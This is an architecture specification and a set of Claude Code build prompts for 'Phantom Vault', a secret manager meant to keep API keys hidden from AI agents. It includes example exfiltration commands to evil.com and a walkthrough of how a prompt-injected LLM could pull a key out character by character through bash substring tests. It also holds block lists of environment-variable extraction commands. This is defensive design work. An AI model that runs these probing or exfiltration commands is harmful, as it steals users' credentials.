# VAULT V2: Next-Generation LLM-Safe Secret Management

**Date:** February 26, 2026
**Status:** Open Source Architecture Specification
**Codename:** Phantom Vault (secrets exist but are never observable)

---

## Part 1: What secretctl Gets Wrong (The Human Blind Spots)

secretctl is the best thing available today. But it has 14 critical blind spots that a motivated attacker or a clever LLM could exploit. These are the gaps that humans consistently miss because they think about secrets the way humans use them, not the way machines exploit them.

---

### Blind Spot 1: The Master Password Paradox

**The problem:** secretctl requires `SECRETCTL_PASSWORD` as an environment variable in the MCP config JSON file. That is a plaintext secret protecting all your other secrets. Anyone who reads `~/.claude.json` or `.mcp.json` owns everything.

**Why humans miss it:** We focus on the vault encryption and forget the key to the vault is taped to the front door.

**The fix:** Eliminate the master password from config entirely. Use macOS Secure Enclave + Touch ID for vault unlock. The decryption key is hardware-bound and biometric-gated. No password exists anywhere in any file, ever. On Linux, use FIDO2/YubiKey or TPM 2.0.

---

### Blind Spot 2: Exact-Match-Only Sanitization

**The problem:** secretctl sanitizes output by looking for the exact string of each secret. If your API key is `sk_live_abc123` and the output contains `c2tfbGl2ZV9hYmMxMjM=` (its Base64 encoding), it passes through unredacted. Same for URL encoding (`sk_live_abc123` becomes `sk_live_abc123` in a URL but `sk%5Flive%5Fabc123` with underscore encoding), hex encoding, partial matches, or reversed strings.

**Why humans miss it:** We think of secrets as fixed strings. Machines think of them as data that can be transformed.

**The fix:** Multi-encoding sanitization. Before scanning output, generate every common transformation of each secret: Base64, URL-encoded, hex, reversed, ROT13, HTML entities, Unicode escape, JSON escaped. Scan for ALL variants. Also scan for any substring longer than 8 characters that matches a sliding window of any secret.

---

### Blind Spot 3: No Memory Protection

**The problem:** When secretctl decrypts a secret and injects it into a subprocess, the plaintext lives in Go process memory. Go's garbage collector moves memory around freely, potentially leaving copies. Memory can be swapped to disk. A core dump captures everything.

**Why humans miss it:** We think "process memory is private." It is, until a crash dump, a debugger attach, or a swap file says otherwise.

**The fix:** Use Rust with the `zeroize` crate for deterministic memory clearing. Use `mlock()` to prevent swap. Use `mprotect()` to mark secret-holding pages as no-read except during the injection moment. Clear immediately after subprocess spawn. Rust guarantees memory is not moved by a GC (because there is no GC).

---

### Blind Spot 4: The Subprocess Can Do Anything

**The problem:** When secretctl runs `curl -H "Authorization: Bearer $API_KEY" https://api.example.com`, the subprocess has the secret in its environment. Nothing stops that subprocess from doing `curl https://evil.com?stolen=$API_KEY` simultaneously. The subprocess is uncontrolled.

**Why humans miss it:** We trust the commands we write. We forget the LLM is choosing the commands.

**The fix:** Network egress filtering. Before spawning the subprocess, configure a firewall rule (or use a namespace/sandbox) that only allows outbound connections to a whitelist of approved domains. If the command is `curl https://api.stripe.com`, only `api.stripe.com` is reachable. Everything else is blocked. Use macOS `pf` firewall rules or Linux `iptables`/`nftables` per-process.

---

### Blind Spot 5: No Canary/Honeypot Detection

**The problem:** If an LLM is compromised via prompt injection and starts probing for secrets, there is zero detection. The LLM could systematically try `secret_run` with various commands, testing boundaries, and nobody knows.

**Why humans miss it:** We build walls but no alarms.

**The fix:** Plant canary secrets in the vault. These are fake API keys that, when used, trigger an immediate alert (email, webhook, Slack notification). If any process touches `CANARY_AWS_KEY` or `CANARY_STRIPE_KEY`, you know something is probing your vault. Use Thinkst Canarytokens or build custom webhook-triggered canaries.

---

### Blind Spot 6: The Differential Oracle Attack

**The problem:** An LLM doesn't need to see the secret directly. It can extract it bit by bit. Example: the LLM runs `secretctl run -k API_KEY -- bash -c 'if [ "${API_KEY:0:1}" = "s" ]; then echo YES; else echo NO; fi'`. The sanitizer doesn't catch this because the secret itself never appears in output. After 40 iterations, the LLM has reconstructed the entire key character by character.

**Why humans miss it:** We think of secrets as atomic. Machines think of them as a sequence of bits that can be tested individually.

**The fix:** Command analysis before execution. Parse the command for patterns that probe environment variable substrings: `${VAR:offset:length}`, `cut`, `awk`, `sed` extracting from env vars, conditional tests against env vars, character-by-character iteration. Block or flag these patterns. Additionally, rate-limit `secret_run` calls: no more than N executions per minute per key, with exponential backoff on repeated access to the same secret.

---

### Blind Spot 7: No Ephemeral/Short-Lived Secrets

**The problem:** secretctl stores long-lived static secrets. A Stripe key created 6 months ago is the same key today. If it was ever leaked (in a log, a crash dump, a screenshot), it is still valid.

**Why humans miss it:** We set it and forget it. Rotation is a chore that nobody schedules.

**The fix:** Built-in secret rotation engine. For supported vendors (Stripe, Clerk, etc.), the vault should be able to call the vendor API to rotate the key automatically on a schedule. Old key is revoked, new key is stored, zero human intervention. For vendors that don't support programmatic rotation, the vault nags with increasing urgency as secrets age.

---

### Blind Spot 8: No Process Lineage Tracking

**The problem:** secretctl knows that a `secret_run` was called. But it doesn't know that the command was initiated by Claude Code, which was triggered by a prompt injection hidden in a web page the user was browsing. The audit log says "curl was run with STRIPE_KEY" but not "this request originated from an untrusted context."

**Why humans miss it:** We assume all `secret_run` calls are legitimate because they came through the MCP server.

**The fix:** Capture the full request chain: which MCP client initiated the call, what was the conversation context hash (not the content, just a fingerprint), was this a human-initiated or auto-initiated action. Tag audit entries with trust levels: HUMAN_DIRECT, LLM_APPROVED, LLM_AUTO. Require human confirmation for LLM_AUTO operations that touch high-sensitivity secrets.

---

### Blind Spot 9: Clipboard Exfiltration

**The problem:** secretctl's desktop app copies secrets to clipboard for convenience. Every application on the system can read the clipboard. A malicious browser tab, a compromised VS Code extension, or any background process can silently read it.

**Why humans miss it:** We think clipboard is "ours." It belongs to every process.

**The fix:** Never use system clipboard for secrets. Instead, use direct stdin piping or a Unix domain socket with authentication. If clipboard is absolutely necessary, auto-clear after 10 seconds AND use macOS Pasteboard privacy features (only allow specific apps to read).

---

### Blind Spot 10: The Config File Is the Attack Surface

**The problem:** MCP config files (`.mcp.json`, `claude_desktop_config.json`) are plain JSON. They contain the path to secretctl, the master password (Blind Spot 1), and the policy file path. An attacker who modifies this file can redirect to a fake vault binary that logs all secrets.

**Why humans miss it:** We protect the vault but not the config that points to the vault.

**The fix:** Sign the configuration. The vault binary should verify its own config file integrity using a hash stored in the Secure Enclave. If the config has been tampered with, the vault refuses to start and alerts the user. Additionally, store the config in a protected location with immutable file flags (`chflags schg` on macOS).

---

### Blind Spot 11: No Output Timing Analysis Protection

**The problem:** Research (Whisper Leak, 2025) showed that LLM response timing and packet sizes leak information. If `secret_run` returns faster for one command than another, the timing difference can reveal information about the secret's value or existence.

**Why humans miss it:** We think about data leaks, not metadata leaks.

**The fix:** Constant-time output return. Pad all `secret_run` responses to fixed sizes. Add random jitter (50-200ms) to all responses regardless of actual execution time. This eliminates timing oracles.

---

### Blind Spot 12: No Secrets Dependency Graph

**The problem:** Secrets have relationships. Your `DATABASE_URL` contains the database password. Your `CLERK_SECRET_KEY` is used to verify JWTs that gate access to the database. If one secret is compromised, which others are affected? secretctl treats every secret as independent.

**Why humans miss it:** We think of secrets as individual items. In reality, they form a trust chain.

**The fix:** Model secret dependencies. When `DATABASE_URL` is compromised, automatically flag `RAILWAY_TOKEN` (which has access to the same database) and `CLERK_SECRET_KEY` (which gates access to the system that uses the database). One-click rotation of the entire dependency chain.

---

### Blind Spot 13: No Multi-Tenant Vault Isolation

**The problem:** If you manage secrets for multiple clients (Advanced Psychology, Camela's Cleaning, YAB), all secrets are in one vault. A `secret_list` call reveals all client key names. An LLM working on Client A can see that secrets for Client B exist.

**Why humans miss it:** We think about encryption. We forget about enumeration.

**The fix:** Vault namespaces. Each client/project gets a namespace. An MCP session is scoped to one namespace. `secret_list` in the "advancedpsych" namespace ONLY returns those secrets. The LLM doesn't even know other namespaces exist.

---

### Blind Spot 14: No Dead Man's Switch

**The problem:** If your laptop is stolen, all secrets are accessible once the thief guesses or brute-forces the master password (or if it's in the MCP config per Blind Spot 1). There's no remote kill switch.

**Why humans miss it:** We plan for normal operations, not for loss of physical control.

**The fix:** Remote revocation capability. The vault phones home to a lightweight service (self-hosted or cloud) periodically. If the device is reported stolen, the service responds with a kill signal that triggers immediate vault wipe. Alternatively, integrate with Apple's Find My / MDM to trigger vault lockout on device wipe.

---

## Part 2: The Improved Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 0: HARDWARE ROOT OF TRUST                                      │
│                                                                         │
│  Apple Secure Enclave (M-series) / TPM 2.0 (Linux) / FIDO2 (YubiKey) │
│  Master key generated IN hardware, never extractable                   │
│  Biometric gate: Touch ID / Face ID / YubiKey touch                   │
│  No master password exists. Anywhere. Ever.                            │
└────────────────────────────────┬────────────────────────────────────────┘
                                 │
                                 │ Hardware-backed decryption
                                 │
┌────────────────────────────────▼────────────────────────────────────────┐
│  LAYER 1: ENCRYPTED VAULT (At Rest)                                    │
│                                                                         │
│  AES-256-GCM + XChaCha20-Poly1305 (dual encryption)                   │
│  Argon2id key derivation (memory-hard)                                 │
│  Written in Rust (deterministic memory, no GC)                         │
│  mlock() on all secret-holding pages                                   │
│  zeroize on drop (compiler-guaranteed cleanup)                         │
│  Namespaced storage (client isolation)                                 │
│  Canary secrets auto-planted per namespace                             │
│  Secret dependency graph maintained                                    │
│  SQLite with WAL mode, 0600 permissions, encrypted at rest             │
└────────────────────────────────┬────────────────────────────────────────┘
                                 │
                                 │ Scoped injection into sandboxed subprocess
                                 │
┌────────────────────────────────▼────────────────────────────────────────┐
│  LAYER 2: RUNTIME INJECTION (In Transit)                               │
│                                                                         │
│  Subprocess spawned in network-restricted sandbox                      │
│  Per-process firewall: only approved domains reachable                 │
│  Secrets injected via direct env, never via file or pipe               │
│  Process dies → mlock pages zeroed → secrets gone                      │
│  Command pre-analysis: block oracle/probing patterns                   │
│  Rate limiting per secret per time window                              │
│  Process lineage tracking (who asked, why, trust level)                │
└────────────────────────────────┬────────────────────────────────────────┘
                                 │
                                 │ Multi-layer sanitization
                                 │
┌────────────────────────────────▼────────────────────────────────────────┐
│  LAYER 3: OUTPUT SANITIZATION (At Return)                              │
│                                                                         │
│  Exact match redaction (original string)                               │
│  Multi-encoding redaction (Base64, URL, hex, HTML entities, etc.)      │
│  Sliding-window substring match (8+ char windows)                      │
│  Constant-time response padding (anti-timing oracle)                   │
│  Random jitter on all responses (50-200ms)                             │
│  Canary trigger detection in output                                    │
│  Response size normalization                                           │
└────────────────────────────────┬────────────────────────────────────────┘
                                 │
                                 │ Tamper-evident logging
                                 │
┌────────────────────────────────▼────────────────────────────────────────┐
│  LAYER 4: AUDIT & DETECTION                                           │
│                                                                         │
│  HMAC-chained append-only log                                          │
│  Process lineage (MCP client → conversation → command)                 │
│  Trust level tagging (HUMAN_DIRECT / LLM_APPROVED / LLM_AUTO)         │
│  Anomaly detection (unusual access patterns, rapid probing)            │
│  Canary alert system (webhook, email, Slack on canary touch)           │
│  Secret age tracking with automated rotation                           │
│  Dependency chain alerting (one compromise flags related secrets)      │
│  Dead man's switch (remote wipe capability)                            │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Part 3: Tech Stack for the Open Source Project

### Language: Rust

**Why Rust over Go (what secretctl uses):**
- Deterministic memory management (no GC moving secrets around)
- `zeroize` crate: compiler-guaranteed memory clearing
- `mlock()` actually works (memory doesn't get relocated)
- Memory safety without runtime overhead
- No accidental copies of secret data
- Strong type system prevents misuse (SecretString type that cannot be printed, logged, or serialized)

### Core Dependencies

| Crate | Purpose |
|-------|---------|
| `ring` or `aes-gcm` | AES-256-GCM encryption |
| `chacha20poly1305` | XChaCha20-Poly1305 (second layer) |
| `argon2` | Key derivation |
| `zeroize` | Deterministic memory clearing |
| `secrecy` | Secret-holding types that prevent Display/Debug |
| `rusqlite` | SQLite storage |
| `security-framework` (macOS) | Keychain / Secure Enclave access |
| `ctap-hid-fido2` | FIDO2/YubiKey support |
| `nix` | mlock, mprotect, process sandboxing |
| `serde` | Serialization (for config, audit logs) |
| `tokio` | Async runtime (for MCP server) |
| `tower` | HTTP/transport middleware (for MCP) |

### Build Targets

- macOS aarch64 (Apple Silicon with Secure Enclave)
- macOS x86_64 (Intel, uses Keychain without Secure Enclave)
- Linux x86_64 (TPM 2.0 or FIDO2)
- Linux aarch64 (Raspberry Pi, cloud ARM)

### What We Specifically Do NOT Use

- Go (GC moves memory, mlock is unreliable)
- Python (too slow for crypto, no memory control)
- Node.js (same GC problems as Go)
- Any cloud service for secret storage (zero trust means zero cloud for secrets at rest)

---

## Part 4: MCP Server Design

### Tools Exposed to LLM

| Tool | Returns | Secret Exposed? |
|------|---------|-----------------|
| `vault_list` | Key names + metadata + namespace | NEVER |
| `vault_exists` | Boolean | NEVER |
| `vault_masked` | Last 4 chars only: `••••WXYZ` | NEVER |
| `vault_run` | Sanitized command output | NEVER |
| `vault_health` | Secret age, expiration warnings | NEVER |
| `vault_rotate` | Rotation status (requires human approval) | NEVER |

### Tools NOT Exposed (Do Not Exist)

- No `vault_get` (raw plaintext retrieval)
- No `vault_export` (bulk extraction)
- No `vault_dump` (debugging tool)
- No `vault_decrypt` (direct decryption)

These tools do not exist in the binary. You cannot call what does not exist.

### Human-Only Operations (Require Biometric + TTY)

| Operation | Requires |
|-----------|----------|
| `phantom get KEY` | Touch ID + direct TTY (not piped) |
| `phantom export` | Touch ID + confirmation prompt |
| `phantom backup` | Touch ID + destination path |
| `phantom rotate --force` | Touch ID |
| `phantom namespace create` | Touch ID |
| `phantom canary create` | Touch ID |

These operations verify they are running in a real terminal (isatty check), not piped through an MCP server or subprocess. An LLM cannot trigger them.

---

## Part 5: The Command Pre-Analysis Engine

Before any `vault_run` command executes, it passes through a static analyzer that blocks oracle attacks.

### Blocked Patterns

```
CATEGORY: Substring Extraction
  ${VAR:offset:length}     → BLOCKED (bash substring)
  echo $VAR | cut -cN-M    → BLOCKED (character extraction)
  echo $VAR | sed 's/./X/N' → BLOCKED (positional replacement)
  echo $VAR | awk '{print substr($0,N,1)}' → BLOCKED
  python -c "print(os.environ['VAR'][N])" → BLOCKED
  node -e "process.env.VAR[N]" → BLOCKED

CATEGORY: Conditional Testing
  if [ "$VAR" = "..." ]    → BLOCKED (equality test against secret)
  test "$VAR" = "..."      → BLOCKED
  [[ $VAR == *pattern* ]]  → BLOCKED (pattern match)
  echo $VAR | grep pattern → BLOCKED (pattern search on secret)

CATEGORY: Encoding/Exfiltration
  echo $VAR | base64       → BLOCKED (encoding for exfil)
  echo $VAR | xxd          → BLOCKED (hex dump)
  echo $VAR | od           → BLOCKED (octal dump)
  curl ...$VAR...          → BLOCKED if VAR in URL path/query
  wget ...$VAR...          → BLOCKED if VAR in URL

CATEGORY: Direct Access
  printenv VAR              → BLOCKED
  echo $VAR                 → BLOCKED
  env | grep VAR            → BLOCKED
  cat /proc/self/environ    → BLOCKED (Linux)
  ps eww                    → BLOCKED (shows env in process list)
```

### Allowed Patterns

```
CATEGORY: Normal Usage (secrets in headers/env, not in command args)
  curl -H "Authorization: Bearer $VAR" https://approved.domain → ALLOWED
  psql $DATABASE_URL -c "SELECT ..." → ALLOWED
  railway deploy → ALLOWED (reads RAILWAY_TOKEN from env)
  stripe listen → ALLOWED (reads STRIPE_SECRET_KEY from env)
  npm run build → ALLOWED (reads env vars normally)
```

The key distinction: secrets used AS environment variables by well-behaved programs are fine. Secrets used AS command arguments, piped through text processing, or tested conditionally are blocked.

---

## Part 6: Claude Code Implementation Prompts

---

### PROMPT 1: Project Scaffolding

```
I need you to scaffold a Rust project called "phantom-vault" — a next-generation
LLM-safe secret manager. Do NOT implement any logic yet. Just create the project
structure.

STRUCTURE:
phantom-vault/
├── Cargo.toml                  # Workspace root
├── README.md                   # Project overview (write this)
├── LICENSE                     # Apache 2.0
├── crates/
│   ├── phantom-core/           # Encryption, storage, memory protection
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── vault.rs        # Vault operations (open, seal, CRUD)
│   │       ├── crypto.rs       # AES-256-GCM + XChaCha20-Poly1305
│   │       ├── memory.rs       # mlock, zeroize, SecretBuffer type
│   │       ├── storage.rs      # SQLite encrypted storage
│   │       ├── namespace.rs    # Multi-tenant namespace isolation
│   │       ├── canary.rs       # Canary/honeypot secret management
│   │       ├── dependency.rs   # Secret dependency graph
│   │       ├── rotation.rs     # Auto-rotation engine
│   │       └── audit.rs        # HMAC-chained audit log
│   │
│   ├── phantom-sanitizer/      # Output sanitization engine
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── exact.rs        # Exact string match
│   │       ├── encoded.rs      # Base64, URL, hex, HTML entity variants
│   │       ├── window.rs       # Sliding window substring match
│   │       └── timing.rs       # Constant-time padding and jitter
│   │
│   ├── phantom-analyzer/       # Command pre-analysis (oracle prevention)
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── patterns.rs     # Blocked pattern definitions
│   │       ├── parser.rs       # Shell command parser
│   │       └── policy.rs       # Policy engine (allow/deny rules)
│   │
│   ├── phantom-sandbox/        # Process sandboxing and network filtering
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── spawn.rs        # Sandboxed subprocess spawning
│   │       ├── network.rs      # Per-process network egress filtering
│   │       └── platform/
│   │           ├── macos.rs    # macOS sandbox-exec / pf
│   │           └── linux.rs    # Linux namespaces / seccomp
│   │
│   ├── phantom-mcp/            # MCP server for Claude Code integration
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── server.rs       # MCP protocol implementation
│   │       ├── tools.rs        # vault_list, vault_run, etc.
│   │       └── lineage.rs      # Request lineage tracking
│   │
│   ├── phantom-hardware/       # Hardware security module abstraction
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── secure_enclave.rs  # macOS Secure Enclave
│   │       ├── tpm.rs             # Linux TPM 2.0
│   │       ├── fido2.rs           # YubiKey / FIDO2
│   │       └── fallback.rs        # Software-only (Argon2id)
│   │
│   └── phantom-cli/            # CLI binary
│       ├── Cargo.toml
│       └── src/
│           └── main.rs         # CLI entrypoint
│
├── tests/
│   ├── integration/            # Integration tests
│   └── security/               # Security-specific tests
│       ├── oracle_attack.rs    # Verify oracle patterns are blocked
│       ├── sanitization.rs     # Verify all encoding variants caught
│       ├── memory.rs           # Verify secrets zeroed after use
│       └── canary.rs           # Verify canary detection works
│
└── docs/
    ├── ARCHITECTURE.md         # This document (copy it in)
    ├── THREAT_MODEL.md         # Formal threat model
    ├── MCP_PROTOCOL.md         # MCP tool specifications
    └── SECURITY_AUDIT.md       # Self-audit checklist

REQUIREMENTS:
- Rust edition 2021, minimum Rust 1.75
- Add all crate dependencies listed in the architecture doc
- Each crate should compile independently
- phantom-cli depends on all other crates
- Add CI config (.github/workflows/ci.yml) with: cargo build, cargo test,
  cargo clippy, cargo audit (security vulnerability scanning)
- Add .gitignore for Rust projects
- README should explain the project vision in 3 paragraphs

Do NOT write implementation code. Only scaffolding, Cargo.toml files,
empty function signatures with doc comments, and the README.
```

---

### PROMPT 2: Core Crypto and Memory Protection

```
Implement phantom-core/src/crypto.rs and phantom-core/src/memory.rs for the
phantom-vault project.

CRYPTO REQUIREMENTS:
- Dual-layer encryption: AES-256-GCM as outer layer, XChaCha20-Poly1305 as inner
- Each secret encrypted with a unique random nonce
- Master key derived from hardware (Secure Enclave) or Argon2id fallback
- Key derivation parameters: Argon2id with 256MB memory, 4 iterations, 4 parallelism
- All cryptographic operations must be constant-time
- Use the `ring` crate for AES-GCM and `chacha20poly1305` for XChaCha20

MEMORY REQUIREMENTS:
- Create a SecretBuffer type that:
  - Allocates memory via mmap (not heap) to avoid GC-like behavior
  - Calls mlock() immediately after allocation
  - Implements Zeroize and ZeroizeOnDrop
  - Implements Drop to call munlock() + munmap()
  - Does NOT implement Display, Debug, Clone, or Serialize
  - Has a with_exposed() method that takes a closure, giving temporary read access
  - Tracks access count for audit
- Create a SecretString type that wraps SecretBuffer for UTF-8 secrets
- All temporary buffers used during encryption/decryption must also be SecretBuffer

TESTS:
- Encrypt/decrypt round-trip
- Verify different nonces for same plaintext produce different ciphertext
- Verify SecretBuffer is zeroed after drop (read freed memory, should be zeros)
- Verify SecretBuffer cannot be printed (compile-time test)
- Verify mlock is called (check /proc/self/status VmLck on Linux)

Use the existing Cargo.toml dependencies. Follow Rust best practices.
Document every public function.
```

---

### PROMPT 3: Multi-Encoding Sanitization Engine

```
Implement phantom-sanitizer for the phantom-vault project.

This is the output sanitization engine that prevents secrets from leaking through
command output in ANY encoding.

REQUIREMENTS:

1. exact.rs — Exact string matching (baseline)
   - Given a set of secrets, scan output for exact matches
   - Replace with [REDACTED:KEY_NAME]
   - Must be O(n*m) worst case where n=output length, m=total secret chars
   - Use Aho-Corasick algorithm for efficient multi-pattern matching

2. encoded.rs — Generate all common encodings of each secret
   For each secret value, pre-compute and add to the match set:
   - Base64 standard encoding
   - Base64 URL-safe encoding
   - URL encoding (percent-encoded)
   - Hex encoding (lowercase and uppercase)
   - HTML entity encoding (&#x...; for each char)
   - JSON escaped (\\uXXXX)
   - Unicode escape sequences
   - Reversed string
   - ROT13 (for alphabetic secrets)
   - Double-URL-encoded
   - With and without padding characters

3. window.rs — Sliding window substring detection
   - For any 8+ character substring of any secret, scan output
   - This catches partial leaks (e.g., secret split across two lines)
   - Configurable minimum window size (default 8)
   - Use rolling hash for performance

4. timing.rs — Anti-timing-oracle response normalization
   - Pad all responses to nearest 1KB boundary
   - Add random jitter between 50ms and 200ms
   - All responses include a fixed set of metadata fields regardless of content
   - Response structure is identical for success and failure

TESTS:
- Test exact match for "sk_live_abc123XYZ"
- Test Base64 detection for same secret
- Test URL-encoded detection
- Test hex detection
- Test partial match (sliding window catches "abc123XY" as substring)
- Test that non-secret text is NOT redacted (false positive check)
- Test performance: sanitize 1MB output with 100 secrets in under 100ms
- Test timing: verify response times are within jitter range regardless of
  whether secrets were found

IMPORTANT: The sanitizer must NEVER return unsanitized output, even on error.
If sanitization fails for any reason, return "[SANITIZATION ERROR - OUTPUT BLOCKED]"
rather than passing through raw output.
```

---

### PROMPT 4: Command Pre-Analysis (Oracle Prevention)

```
Implement phantom-analyzer for the phantom-vault project.

This module analyzes shell commands BEFORE execution to detect oracle attacks
where an LLM tries to extract secrets character by character.

REQUIREMENTS:

1. parser.rs — Shell command parser
   - Parse bash/zsh commands into an AST-like structure
   - Identify: pipes, redirections, subshells, variable references,
     conditionals, loops, command substitution
   - Handle: single quotes, double quotes, heredocs, backticks
   - Does not need to be a full shell parser — focus on security-relevant patterns

2. patterns.rs — Blocked pattern definitions
   Define and detect these pattern categories:

   SUBSTRING_EXTRACTION:
   - ${VAR:N:M} (bash substring)
   - echo $VAR | cut -cN-M
   - echo $VAR | awk substr patterns
   - echo $VAR | sed character extraction
   - python/node/ruby one-liners accessing env var characters

   CONDITIONAL_TESTING:
   - if/test/[[ comparing against env var values
   - case statements on env vars
   - grep/awk pattern matching on env var values

   ENCODING_EXFILTRATION:
   - base64/xxd/od/hexdump on env vars
   - env var values in curl/wget URL paths or query strings
   - env var values in DNS lookups (dig/nslookup with var in query)

   DIRECT_ACCESS:
   - printenv, env, export (listing all vars)
   - cat /proc/self/environ
   - ps eww (shows env in process list)
   - /proc/*/environ access

   WRITE_TO_FILE:
   - Redirecting env var content to files (echo $VAR > file)
   - Writing env vars to /tmp or world-readable locations

3. policy.rs — Policy engine
   - Load policy from YAML file
   - Support: allowed_commands (whitelist), blocked_patterns (blacklist),
     per-secret command restrictions, domain whitelist for network access
   - Default policy: deny all except explicitly allowed
   - Policy is signed (HMAC with vault key) to prevent tampering

ANALYSIS RESULT:
Return one of:
- ALLOW: command is safe, proceed
- BLOCK(reason): command matches a dangerous pattern, explain why
- WARN(reason): command is suspicious but not definitively dangerous,
  log and proceed (or require human confirmation based on policy)

TESTS:
- Test that `echo $API_KEY` is BLOCKED
- Test that `curl -H "Auth: Bearer $API_KEY" https://api.stripe.com` is ALLOWED
- Test that `if [ "${API_KEY:0:1}" = "s" ]; then echo Y; fi` is BLOCKED
- Test that `psql $DATABASE_URL -c "SELECT 1"` is ALLOWED
- Test that `echo $API_KEY | base64` is BLOCKED
- Test that `curl https://evil.com?k=$API_KEY` is BLOCKED
- Test that `railway deploy` (reads RAILWAY_TOKEN from env) is ALLOWED
- Test that `cat /proc/self/environ` is BLOCKED
- Test 20+ additional edge cases covering each pattern category
```

---

### PROMPT 5: MCP Server with Lineage Tracking

```
Implement phantom-mcp for the phantom-vault project.

This is the MCP server that Claude Code connects to. It exposes a limited set of
tools that NEVER return plaintext secrets.

REQUIREMENTS:

1. server.rs — MCP protocol implementation
   - Implement MCP stdio transport (stdin/stdout JSON-RPC)
   - Handle: initialize, tools/list, tools/call
   - Stateful: maintains vault session after biometric unlock
   - Auto-lock after configurable idle timeout (default 15 minutes)

2. tools.rs — Tool definitions

   vault_list(namespace?: string)
   → Returns: [{name, created, expires, tags, last_accessed, access_count}]
   → Never returns values

   vault_exists(key: string, namespace?: string)
   → Returns: {exists: bool, metadata: {...}}

   vault_masked(key: string, namespace?: string)
   → Returns: {masked: "••••WXYZ"} (last 4 chars only)

   vault_run(keys: string[], command: string, namespace?: string)
   → Pre-analysis check (phantom-analyzer)
   → If BLOCKED: return error with reason, do not execute
   → If ALLOWED: spawn sandboxed subprocess (phantom-sandbox)
   → Inject secrets as env vars
   → Capture output
   → Sanitize output (phantom-sanitizer)
   → Return sanitized output + metadata (exit_code, duration)
   → Log to audit trail with lineage

   vault_health(namespace?: string)
   → Returns: secrets expiring soon, rotation status, canary status, audit summary

   vault_rotate(key: string, namespace?: string)
   → Returns: {status: "pending_human_approval", message: "..."}
   → Actual rotation requires biometric confirmation via CLI

3. lineage.rs — Request lineage tracking
   - For every tool call, record:
     - Timestamp
     - MCP client identifier
     - Tool name and arguments (with secret values stripped)
     - Trust level: infer from context
       - If called by human via CLI: HUMAN_DIRECT
       - If called by MCP with recent human interaction: LLM_APPROVED
       - If called by MCP without recent human interaction: LLM_AUTO
     - Result summary (success/failure, was anything redacted)
   - Store in audit log
   - For LLM_AUTO + high-sensitivity secret: require confirmation

CONFIGURATION:
MCP config in ~/.phantom/mcp-config.toml:
  [server]
  idle_timeout_minutes = 15
  max_runs_per_minute = 10
  require_biometric = true

  [namespaces]
  default = "personal"
  allowed = ["personal", "ib365", "advancedpsych"]

  [sensitivity]
  high = ["DATABASE_URL", "STRIPE_SECRET_KEY", "CLERK_SECRET_KEY"]
  medium = ["RAILWAY_TOKEN", "VERCEL_TOKEN"]
  low = ["ELEVENLABS_API_KEY"]

TESTS:
- Test vault_list returns names only, never values
- Test vault_run with a safe command returns sanitized output
- Test vault_run with an oracle attack command returns BLOCKED
- Test vault_run rate limiting (11th call in 1 minute is rejected)
- Test auto-lock after idle timeout
- Test lineage tracking records all fields
- Test namespace isolation (can't list secrets from other namespace)
```

---

### PROMPT 6: Security Test Suite

```
Implement the security test suite in tests/security/ for phantom-vault.

These tests verify that the vault cannot be bypassed by any known attack vector.
Each test should be a self-contained scenario that attempts to extract a secret
and verifies the attempt fails.

TESTS TO IMPLEMENT:

oracle_attack.rs:
1. Attempt bash substring extraction: ${SECRET:0:1}, ${SECRET:1:1}, etc.
   → Verify ALL are BLOCKED by analyzer
2. Attempt conditional probing: if [ "$SECRET" = "a..." ]
   → Verify BLOCKED
3. Attempt cut/awk/sed extraction on piped secret
   → Verify BLOCKED
4. Attempt Python one-liner: python -c "import os; print(os.environ['KEY'][0])"
   → Verify BLOCKED
5. Attempt 100 rapid oracle probes
   → Verify rate limiting kicks in after configured threshold

sanitization.rs:
6. Plant a known secret, run command that outputs it in Base64
   → Verify redacted in output
7. Plant a known secret, run command that outputs it URL-encoded
   → Verify redacted
8. Plant a known secret, run command that outputs it in hex
   → Verify redacted
9. Plant a known secret, run command that outputs partial match (8 chars)
   → Verify redacted
10. Run command that outputs NON-secret text
    → Verify NOT redacted (no false positives)
11. Run command where sanitizer itself errors
    → Verify output is BLOCKED entirely, not passed through

memory.rs:
12. Store a secret, retrieve it, drop the SecretBuffer
    → Read the freed memory region → verify it's zeroed
13. Verify mlock is active on secret-holding pages
14. Verify SecretBuffer does not implement Debug (compile-time test)
15. Verify SecretString does not implement Serialize (compile-time test)

canary.rs:
16. Create a canary secret
    → Attempt to use it via vault_run
    → Verify alert is triggered
17. Create canary with webhook
    → Trigger it → verify webhook was called
18. Verify canary secrets appear in vault_list like normal secrets
    (attacker shouldn't be able to distinguish canaries from real secrets)

namespace.rs:
19. Create secrets in namespace A and namespace B
    → In namespace A session, run vault_list
    → Verify namespace B secrets are not returned
20. Attempt vault_run with a secret from a different namespace
    → Verify BLOCKED

lineage.rs:
21. Run vault_run and verify audit log contains full lineage
22. Simulate LLM_AUTO trust level + high sensitivity secret
    → Verify operation requires confirmation
23. Verify audit log HMAC chain integrity after 100 operations

Each test must include:
- Description of the attack being tested
- The specific command or operation attempted
- The expected result (BLOCKED / REDACTED / ZEROED / ALERT)
- Assertion that verifies the defense worked
```

---

## Part 7: Open Source Strategy

### Repository Name
`phantom-vault` — "secrets exist but are never observable"

### License
Apache 2.0 (same as secretctl, compatible with commercial use)

### Tagline
"The API key vault where secrets are used but never seen. Built for the age of AI agents."

### First Release Milestones

| Version | Scope |
|---------|-------|
| 0.1.0 | Core crypto + memory protection + basic CLI (store/get) |
| 0.2.0 | Multi-encoding sanitizer + command pre-analysis |
| 0.3.0 | MCP server (Claude Code integration) |
| 0.4.0 | Secure Enclave / FIDO2 integration |
| 0.5.0 | Namespace isolation + canary secrets |
| 0.6.0 | Process sandboxing + network filtering |
| 0.7.0 | Audit system + lineage tracking |
| 0.8.0 | Secret rotation engine |
| 0.9.0 | Security audit + penetration testing |
| 1.0.0 | Production release |

### Contributing Guide Focus
- Security researchers welcome (responsible disclosure policy)
- Every PR must include security test for the change
- No unsafe blocks without documented justification
- Fuzzing targets for all input parsing (sanitizer, analyzer, MCP protocol)
